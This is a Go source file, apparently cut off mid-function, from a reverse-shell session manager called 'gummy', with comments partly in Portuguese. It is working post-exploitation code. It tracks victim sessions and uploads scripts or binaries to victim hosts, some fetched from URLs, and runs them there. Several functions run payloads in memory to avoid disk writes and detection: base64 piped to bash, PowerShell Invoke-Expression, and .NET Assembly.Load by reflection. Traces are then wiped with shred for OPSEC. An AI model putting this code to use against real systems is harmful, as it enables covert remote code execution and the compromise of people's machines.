package internal

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf8"

	"github.com/chsoares/gummy/internal/ui"
	"github.com/chzyer/readline"
	"golang.org/x/term"
)

// Manager gerencia múltiplas sessões de reverse shell
type Manager struct {
	sessions        map[string]*SessionInfo // Mapa de sessões ativas
	mu              sync.RWMutex            // Proteção concorrente
	nextID          int                     // Próximo ID numérico
	activeConn      net.Conn                // Conexão atualmente ativa (se houver)
	selectedSession *SessionInfo            // Sessão selecionada (mas não necessariamente ativa)
	menuActive      bool                    // Se estamos no menu principal
	silent          bool                    // Suppress console output (reserved for future use)
	listenerIP      string                  // IP do listener para geração de payloads
	listenerPort    int                     // Porta do listener para geração de payloads
}

// SessionInfo contém informações sobre uma sessão
type SessionInfo struct {
	ID        string    // ID único da sessão (hex)
	NumID     int       // ID numérico para facilitar uso
	Conn      net.Conn  // Conexão TCP
	RemoteIP  string    // IP da vítima
	Whoami    string    // user@host da vítima
	Platform  string    // Plataforma (linux/windows/unknown)
	Handler   *Handler  // Shell handler
	Active    bool      // Se está sendo usada atualmente
	CreatedAt time.Time // Timestamp de criação
}

// Directory retorna o diretório base da sessão
// Formato: ~/.gummy/YYYY_MM_DD/IP_user_hostname/
func (s *SessionInfo) Directory() string {
	date := s.CreatedAt.Format("2006_01_02")
	whoami := sanitizePath(s.Whoami)
	dirname := fmt.Sprintf("%s_%s", s.RemoteIP, whoami)

	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".gummy", date, dirname)
}

// ScriptsDir retorna o diretório de scripts e cria se não existir
func (s *SessionInfo) ScriptsDir() string {
	dir := filepath.Join(s.Directory(), "scripts")
	os.MkdirAll(dir, 0755)
	return dir
}

// LogsDir retorna o diretório de logs e cria se não existir
func (s *SessionInfo) LogsDir() string {
	dir := filepath.Join(s.Directory(), "logs")
	os.MkdirAll(dir, 0755)
	return dir
}

// sanitizePath remove caracteres problemáticos do path
func sanitizePath(s string) string {
	replacer := strings.NewReplacer(
		"@", "_",
		"\\", "_",
		"/", "_",
		" ", "_",
		":", "_",
		"*", "_",
		"?", "_",
		"\"", "_",
		"<", "_",
		">", "_",
		"|", "_",
	)
	return replacer.Replace(s)
}

// RunScript downloads (if URL), uploads to victim, executes, streams output
// Simple approach that actually works with clean output
func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var scriptPath string
	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
		if err := DownloadFile(scriptSource, scriptPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		scriptPath = scriptSource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Upload script
	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
	t := NewTransferer(s.Conn, s.ID)
	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
		return fmt.Errorf("upload failed: %w", err)
	}

	// Build args
	argsStr := ""
	if len(args) > 0 {
		argsStr = " " + strings.Join(args, " ")
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing script and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure upload markers are processed
		time.Sleep(200 * time.Millisecond)

		cmd := fmt.Sprintf("bash %s%s", remotePath, argsStr)
		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}

		// Cleanup (shred if available for better OPSEC, otherwise rm)
		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s 2>/dev/null || rm -f %s\n", remotePath, remotePath))
	}()

	return nil
}

// RunScriptInMemory downloads script locally, loads to bash variable (in-memory on victim), executes
// This avoids writing script to disk on victim (more stealthy)
// scriptSource: URL or local path to script file
// args: arguments to pass to the script
func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var scriptPath string
	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
		if err := DownloadFile(scriptSource, scriptPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		scriptPath = scriptSource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Generate unique variable name
	varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())

	// Upload script to bash variable (in-memory, no disk write)
	t := NewTransferer(s.Conn, s.ID)
	if err := t.UploadToBashVariable(context.Background(), scriptPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Build args
	argsStr := ""
	if len(args) > 0 {
		argsStr = " -- " + strings.Join(args, " ")
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing script (in-memory) and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure variable is fully loaded
		time.Sleep(200 * time.Millisecond)

		// Execute from variable: decode base64 and pipe to bash
		// The variable contains base64-encoded script, so we decode and execute
		cmd := fmt.Sprintf("echo \"$%s\" | base64 -d | bash -s%s", varName, argsStr)
		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}

		// Cleanup variable (unset removes from memory)
		s.Handler.SendCommand(fmt.Sprintf("unset %s\n", varName))
	}()

	return nil
}

// RunBinary downloads (if URL), uploads to victim, makes executable, runs
// Same as RunScript but for binary executables (no bash interpreter)
func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var binaryPath string
	if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
		binaryPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(binarySource))
		if err := DownloadFile(binarySource, binaryPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		binaryPath = binarySource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Upload binary
	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
	t := NewTransferer(s.Conn, s.ID)
	if err := t.Upload(context.Background(), binaryPath, remotePath); err != nil {
		return fmt.Errorf("upload failed: %w", err)
	}

	// Build args
	argsStr := ""
	if len(args) > 0 {
		argsStr = " " + strings.Join(args, " ")
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing binary and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure upload markers are processed
		time.Sleep(200 * time.Millisecond)

		// For long-running binaries: timeout 5m, run in background, redirect output
		// This allows the command to return immediately while binary runs
		remoteOutput := remotePath + ".out"
		cmd := fmt.Sprintf("chmod +x %s && timeout 5m %s%s > %s 2>&1 &",
			remotePath, remotePath, argsStr, remoteOutput)

		// Send command (returns immediately since it's backgrounded)
		s.Handler.SendCommand(cmd + "\n")
		time.Sleep(500 * time.Millisecond)

		// Tail the output file on remote (this streams to our local file)
		tailCmd := fmt.Sprintf("timeout 5m tail -f %s 2>/dev/null", remoteOutput)
		if err := s.Handler.ExecuteWithStreaming(tailCmd, outputPath); err != nil {
			// Timeout is expected, not an error
		}

		// Cleanup both binary and output file
		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s %s 2>/dev/null || rm -f %s %s\n",
			remotePath, remoteOutput, remotePath, remoteOutput))
	}()

	return nil
}

// RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
// Similar to RunScriptInMemory but for PowerShell on Windows
func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var scriptPath string
	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
		if err := DownloadFile(scriptSource, scriptPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		scriptPath = scriptSource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Generate unique variable name
	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())

	// Upload script to PowerShell variable (in-memory, no disk write)
	t := NewTransferer(s.Conn, s.ID)
	if err := t.UploadToPowerShellVariable(context.Background(), scriptPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Build args (PowerShell style)
	argsStr := ""
	if len(args) > 0 {
		argsStr = " " + strings.Join(args, " ")
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (in-memory) and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure variable is fully loaded
		time.Sleep(500 * time.Millisecond) // Increased for PowerShell

		// Debug: Check if variable exists and has content
		debugCmd := fmt.Sprintf("if ($%s) { Write-Host 'Variable loaded: yes' } else { Write-Host 'Variable loaded: no' }\r\n", varName)
		s.Handler.SendCommand(debugCmd)
		time.Sleep(200 * time.Millisecond)

		// Execute from variable: decode base64 and invoke
		// PowerShell syntax: decode UTF8 string from base64, then Invoke-Expression
		cmd := fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); Invoke-Expression \"$decoded%s\"; Remove-Variable -Name %s\r\n", varName, argsStr, varName)
		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}
	}()

	return nil
}

// RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
// Uses reflection to load and execute assembly from memory
func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var assemblyPath string
	if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
		assemblyPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(assemblySource))
		if err := DownloadFile(assemblySource, assemblyPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		assemblyPath = assemblySource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Generate unique variable name
	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())

	// Upload assembly to PowerShell variable (in-memory, no disk write)
	t := NewTransferer(s.Conn, s.ID)
	if err := t.UploadToPowerShellVariable(context.Background(), assemblyPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Build args (PowerShell array syntax)
	argsStr := ""
	if len(args) > 0 {
		// Convert to PowerShell array: @('arg1', 'arg2')
		quotedArgs := make([]string, len(args))
		for i, arg := range args {
			quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
		}
		argsStr = "@(" + strings.Join(quotedArgs, ", ") + ")"
	} else {
		argsStr = "@()"
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (in-memory) and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure variable is fully loaded
		time.Sleep(200 * time.Millisecond)

		// Execute assembly via reflection
		// 1. Decode base64 to bytes
		// 2. Load assembly with [Reflection.Assembly]::Load()
		// 3. Find and invoke entry point
		cmd := fmt.Sprintf(`
$bytes = [System.Convert]::FromBase64String($%s)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
if ($entryPoint -ne $null) {
    $entryPoint.Invoke($null, %s)
} else {
    Write-Host 'No entry point found in assembly'
}
Remove-Variable -Name %s
`, varName, argsStr, varName)

		if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}
	}()

	return nil
}

// RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
// Similar to RunScriptInMemory but for Python
func (s *SessionInfo) RunPythonInMemory(scriptSource string, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")

	// Download if URL
	var scriptPath string
	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
		if err := DownloadFile(scriptSource, scriptPath); err != nil {
			return fmt.Errorf("download failed: %w", err)
		}
	} else {
		scriptPath = scriptSource
	}

	// Output file
	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")

	// Create empty output file for tail -f
	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
		return fmt.Errorf("failed to create output file: %w", err)
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -f %s", outputPath)

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
	}

	time.Sleep(300 * time.Millisecond)

	// Generate unique variable name
	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())

	// Upload script to Python variable (in-memory, no disk write)
	t := NewTransferer(s.Conn, s.ID)
	if err := t.UploadToPythonVariable(context.Background(), scriptPath, varName); err != nil {
		return fmt.Errorf("upload to memory failed: %w", err)
	}

	// Build args (Python sys.argv style)
	argsStr := ""
	if len(args) > 0 {
		argsStr = " " + strings.Join(args, " ")
	}

	// Show execution message with output path
	fmt.Println(ui.Info(fmt.Sprintf("Executing Python script (in-memory) and saving output to: %s", outputPath)))

	go func() {
		// Small delay to ensure variable is fully loaded
		time.Sleep(200 * time.Millisecond)

		// Execute from variable: decode base64 and exec
		// Python syntax: decode base64 string, then exec()
		cmd := fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode(%s).decode('utf-8'))\" %s; unset %s\n", varName, argsStr, varName)
		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}
	}()

	return nil
}

// GummyCompleter implements readline.AutoCompleter for smart path completion
type GummyCompleter struct {
	manager *Manager
}

// Do implements the AutoCompleter interface
func (c *GummyCompleter) Do(line []rune, pos int) (newLine [][]rune, length int) {
	lineStr := string(line[:pos])
	trimmed := strings.TrimLeft(lineStr, " \t")

	commands := []string{"upload", "download", "list", "use", "shell", "kill", "help", "exit", "clear", "ssh", "rev", "spawn", "run", "modules"}

	// Nothing typed yet, show all commands
	if trimmed == "" {
		matches, repl := c.completeFromList("", commands)
		return matches, repl
	}

	parts := strings.Fields(trimmed)
	if len(parts) == 0 {
		return nil, 0
	}

	// Still typing the command (no space yet)
	if len(parts) == 1 && !strings.HasSuffix(trimmed, " ") {
		prefix := parts[0]
		matches, repl := c.completeFromList(prefix, commands)
		return matches, repl
	}

	cmd := parts[0]
	argCount := len(parts) - 1

	// If the line ends with a space, we're starting a new argument
	if strings.HasSuffix(trimmed, " ") {
		argCount++
	}

	currentArg := c.getCurrentArg(trimmed)

	switch cmd {
	case "upload":
		if argCount == 1 {
			// First arg: complete local paths
			return c.completeLocalPath(currentArg)
		} else if argCount == 2 {
			// Second arg: complete remote paths
			return c.completeRemotePath(currentArg)
		}
	case "download":
		if argCount == 1 {
			// First arg: complete remote paths
			return c.completeRemotePath(currentArg)
		} else if argCount == 2 {
			// Second arg: complete local paths
			return c.completeLocalPath(currentArg)
		}
	}

	return nil, 0
}

// getCurrentArg extracts the current argument being typed
func (c *GummyCompleter) getCurrentArg(line string) string {
	if strings.HasSuffix(line, " ") {
		return ""
	}

	parts := strings.Fields(line)
	if len(parts) == 0 {
		return ""
	}

	return parts[len(parts)-1]
}

// completeFromList completes from a list of strings
func (c *GummyCompleter) completeFromList(prefix string, list []string) ([][]rune, int) {
	var candidates []string
	for _, item := range list {
		if strings.HasPrefix(item, prefix) {
			candidates = append(candidates, item)
		}
	}

	sort.Strings(candidates)

	prefixRunes := []rune(prefix)
	removeLen := len(prefixRunes)

	matches := make([][]rune, 0, len(candidates))
	for _, item := range candidates {
		itemRunes := []rune(item)
		if len(itemRunes) < removeLen {
			continue
		}
		matches = append(matches, itemRunes[removeLen:])
	}

	return matches, removeLen
}

// completeLocalPath completes local file paths
func (c *GummyCompleter) completeLocalPath(arg string) ([][]rune, int) {
	replacementLen := utf8.RuneCountInString(arg)

	dirPart, basePart := splitPathForCompletion(arg)
	if arg == "~" || arg == "~"+string(os.PathSeparator) {
		dirPart = "~" + string(os.PathSeparator)
		basePart = ""
	}

	searchDir := dirPart
	if searchDir == "" {
		if strings.HasPrefix(arg, "~") {
			searchDir = "~"
		} else {
			searchDir = "."
		}
	}

	expandedDir := expandUserPath(searchDir)
	entries, err := os.ReadDir(expandedDir)
	if err != nil {
		return nil, replacementLen
	}

	var suggestions []string
	for _, entry := range entries {
		name := entry.Name()
		if basePart != "" && !strings.HasPrefix(name, basePart) {
			continue
		}

		suggestion := dirPart + name
		if entry.IsDir() {
			suggestion += string(os.PathSeparator)
		}
		if strings.HasPrefix(suggestion, arg) || arg == "" {
			suggestions = append(suggestions, suggestion)
		}
	}

	sort.Strings(suggestions)

	argRunes := []rune(arg)
	matches := make([][]rune, 0, len(suggestions))
	for _, suggestion := range suggestions {
		suggestionRunes := []rune(suggestion)
		if len(argRunes) > len(suggestionRunes) {
			continue
		}
		matches = append(matches, suggestionRunes[len(argRunes):])
	}

	return matches, replacementLen
}

// completeRemotePath attempts to complete remote file paths
func (c *GummyCompleter) completeRemotePath(prefix string) ([][]rune, int) {
	return nil, utf8.RuneCountInString(prefix)
}

func splitPathForCompletion(arg string) (dirPart, basePart string) {
	if arg == "" {
		return "", ""
	}

	// Support both / and \ as separators so Windows paths work too
	lastSep := strings.LastIndexAny(arg, "/\\")
	if lastSep == -1 {
		return "", arg
	}

	return arg[:lastSep+1], arg[lastSep+1:]
}

func expandUserPath(path string) string {
	if path == "" {
		return "."
	}

	if path == "~" || path == "~"+string(os.PathSeparator) {
		if home, err := os.UserHomeDir(); err == nil {
			return home
		}
		return "."
	}

	if strings.HasPrefix(path, "~"+string(os.PathSeparator)) {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, path[2:])
		}
		return path
	}

	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			return filepath.Join(home, path[2:])
		}
		return path
	}

	return path
}

// Remote path completion removed

// NewManager cria um novo gerenciador de sessões
func NewManager() *Manager {
	return &Manager{
		sessions:        make(map[string]*SessionInfo),
		nextID:          1,
		selectedSession: nil,
		menuActive:      true,
		silent:          false,
	}
}

// SetSilent enables/disables console output
func (m *Manager) SetSilent(silent bool) {
	m.silent = silent
}

// SetListenerIP sets the listener IP and port for payload generation
func (m *Manager) SetListenerIP(ip string) {
	m.listenerIP = ip
}

// SetListenerPort sets the listener port for payload generation
func (m *Manager) SetListenerPort(port int) {
	m.listenerPort = port
}

// AddSession adiciona uma nova sessão ao gerenciador
func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	handler := NewHandler(conn, id)

	// Configure callback para quando conexão fechar
	handler.SetCloseCallback(func(sessionID string) {
		m.RemoveSession(sessionID)
	})

	session := &SessionInfo{
		ID:        id,
		NumID:     m.nextID,
		Conn:      conn,
		RemoteIP:  remoteIP,
		Whoami:    "detecting...",
		Platform:  "detecting...",
		Handler:   handler,
		Active:    false,
		CreatedAt: time.Now(),
	}

	m.sessions[id] = session
	m.nextID++

	// Detecta whoami e platform SINCRONAMENTE antes de iniciar handler
	// Isso garante que Platform está definido antes de Start() decidir sobre raw mode
	m.detectSessionInfo(session)

	// Configura platform no handler ANTES de qualquer uso
	handler.SetPlatform(session.Platform)

	// Inicia monitoramento da sessão
	go m.monitorSession(session)

	// Only print if not in silent mode
	if !m.silent {
		if m.menuActive {
			// Se estivermos no menu, quebrar a linha atual, mostrar notificação e novo prompt
			fmt.Printf("\r%s\n%s", ui.SessionOpened(session.NumID, remoteIP), ui.Prompt())
		} else {
			// Se estivermos em uma shell interativa, apenas quebrar linha e mostrar notificação
			// Deixa o usuário continuar na shell atual (pode apertar Enter para novo prompt)
			fmt.Printf("\r\n%s\n", ui.SessionOpened(session.NumID, remoteIP))
		}
	}
}

// RemoveSession remove uma sessão do gerenciador
func (m *Manager) RemoveSession(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, exists := m.sessions[id]
	if !exists {
		return
	}

	fmt.Println(ui.SessionClosed(session.NumID, session.RemoteIP))

	// Se era a sessão selecionada, limpar seleção
	if m.selectedSession != nil && m.selectedSession.ID == id {
		m.selectedSession = nil
	}

	delete(m.sessions, id)

	// Se era a sessão ativa, voltar ao menu
	if session.Active {
		m.activeConn = nil
		m.menuActive = true
		if len(m.sessions) > 0 {
			m.showMenu()
		} else {
			fmt.Println("No active sessions")
		}
	}
}

// ListSessions mostra todas as sessões ativas
func (m *Manager) ListSessions() {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if len(m.sessions) == 0 {
		fmt.Println(ui.Info("No active sessions"))
		return
	}

	// Collect all session lines
	var lines []string
	lines = append(lines, ui.TableHeader("id  remote address     whoami                    platform"))

	// Ordenar por NumID para exibição consistente
	var sessions []*SessionInfo
	for _, session := range m.sessions {
		sessions = append(sessions, session)
	}
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	for _, session := range sessions {
		sessionLine := fmt.Sprintf("%-3d %-18s %-25s %s", session.NumID, session.RemoteIP, session.Whoami, session.Platform)
		if session.Active {
			lines = append(lines, ui.SessionActive(sessionLine))
		} else {
			lines = append(lines, ui.SessionInactive(sessionLine))
		}
	}

	// Render everything inside a box
	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Active Sessions", ui.SymbolGem), lines))
}

// UseSession seleciona uma sessão específica (não entra na shell)
func (m *Manager) UseSession(numID int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		return fmt.Errorf("session %d not found", numID)
	}

	// Testa se a sessão está viva antes de selecioná-la
	targetSession.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
	_, err := targetSession.Conn.Write([]byte{})
	targetSession.Conn.SetWriteDeadline(time.Time{})

	if err != nil {
		// Sessão morta, remove ela
		m.mu.Unlock()
		fmt.Println(ui.Error("Session is dead, removing..."))
		m.RemoveSession(targetSession.ID)
		return fmt.Errorf("session %d is no longer alive", numID)
	}

	// Desativa todas as sessões
	for _, session := range m.sessions {
		session.Active = false
	}

	// Marca a sessão selecionada como ativa
	targetSession.Active = true
	m.selectedSession = targetSession
	fmt.Println(ui.UsingSession(targetSession.NumID, targetSession.RemoteIP))

	return nil
}

// KillSession mata uma sessão específica
func (m *Manager) KillSession(numID int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	var targetSession *SessionInfo
	for _, session := range m.sessions {
		if session.NumID == numID {
			targetSession = session
			break
		}
	}

	if targetSession == nil {
		return fmt.Errorf("session %d not found", numID)
	}

	// Fecha a conexão
	targetSession.Conn.Close()

	// Se era a sessão selecionada, limpa seleção
	if m.selectedSession != nil && m.selectedSession.ID == targetSession.ID {
		m.selectedSession = nil
	}

	// Remove da lista
	delete(m.sessions, targetSession.ID)

	fmt.Println(ui.SessionClosed(targetSession.NumID, targetSession.RemoteIP))

	return nil
}

// handleModulesList lista todos os módulos disponíveis
func (m *Manager) handleModulesList() {
	registry := GetModuleRegistry()
	categories := registry.ListByCategory()

	if len(categories) == 0 {
		fmt.Println(ui.Info("No modules available"))
		return
	}

	var lines []string

	// Explicit category order (Linux, Windows, Misc, Custom)
	categoryOrder := []string{"linux", "windows", "misc", "custom"}

	// Build module list grouped by category
	for _, cat := range categoryOrder {
		// Skip if category has no modules
		if len(categories[cat]) == 0 {
			continue
		}
		lines = append(lines, ui.CommandHelp(cat))
		for _, mod := range categories[cat] {
			modeSymbol := ui.ExecutionModeSymbol(mod.ExecutionMode())
			line := fmt.Sprintf("%s %-15s - %s", modeSymbol, mod.Name(), mod.Description())
			lines = append(lines, ui.Command(line))
		}
		lines = append(lines, "")
	}

	// Remove trailing empty line
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}

	// Add legend at the bottom
	lines = append(lines, ui.ExecutionModeLegend())

	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Available Modules", ui.SymbolGem), lines))
}

// handleRunModule executa um módulo
func (m *Manager) handleRunModule(moduleName string, args []string) {
	// Check if session is selected
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Get module from registry
	registry := GetModuleRegistry()
	module, exists := registry.Get(moduleName)
	if !exists {
		fmt.Println(ui.Error(fmt.Sprintf("Unknown module: %s", moduleName)))
		fmt.Println(ui.Info("Type 'modules' to see available modules"))
		return
	}

	// Run module
	fmt.Println(ui.Info(fmt.Sprintf("Running module: %s (%s)", module.Name(), module.Category())))
	if err := module.Run(m.selectedSession, args); err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Module failed: %v", err)))
		return
	}
}

// detectSessionInfo detecta user@host e plataforma da sessão
func (m *Manager) detectSessionInfo(session *SessionInfo) {
	// Aguarda shell enviar algo
	time.Sleep(1000 * time.Millisecond)

	// Lê o que tiver disponível (com múltiplas tentativas)
	initialPrompt := ""
	buffer := make([]byte, 4096)

	for attempt := 0; attempt < 10; attempt++ {
		session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := session.Conn.Read(buffer)
		session.Conn.SetReadDeadline(time.Time{})

		if n > 0 {
			initialPrompt += string(buffer[:n])
		}

		if err == nil && n > 0 {
			// Continue lendo se tiver mais dados
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Se já temos dados suficientes, pode parar
		if len(initialPrompt) > 0 {
			break
		}

		// Senão, espera mais um pouco
		time.Sleep(300 * time.Millisecond)
	}

	// Detecta platform baseado no prompt recebido
	detectedPlatform := "unknown"

	if strings.Contains(initialPrompt, "PS ") || strings.Contains(initialPrompt, "C:\\") || strings.Contains(initialPrompt, "C:/") {
		detectedPlatform = "windows"
	} else if strings.Contains(initialPrompt, "$") || strings.Contains(initialPrompt, "#") {
		detectedPlatform = "linux"
	}

	session.Platform = detectedPlatform

	// Para Windows, tenta comando diferente que funcione com WinRM reverse shells
	var detectionCmd string
	if detectedPlatform == "windows" {
		detectionCmd = "echo $env:USERNAME@$env:COMPUTERNAME\r\n"
	} else {
		detectionCmd = "echo $(whoami 2>/dev/null)@$(hostname 2>/dev/null)\n"
	}

	_, err := session.Conn.Write([]byte(detectionCmd))
	if err != nil {
		session.Whoami = "unknown"
		return
	}

	// Aguarda execução
	time.Sleep(800 * time.Millisecond)

	// Lê toda a resposta em múltiplas tentativas com timeout curto
	allData := ""
	readBuffer := make([]byte, 2048)
	foundWhoami := false
	foundPlatform := false

	// IMPORTANTE: verifica se já detectamos platform pelo prompt inicial
	if detectedPlatform != "unknown" {
		foundPlatform = true
	}

	for i := 0; i < 20; i++ { // mais tentativas
		// Timeout curto por tentativa (não timeout total)
		session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := session.Conn.Read(readBuffer)

		if err != nil {
			// Se é timeout mas já encontramos tudo, pode sair
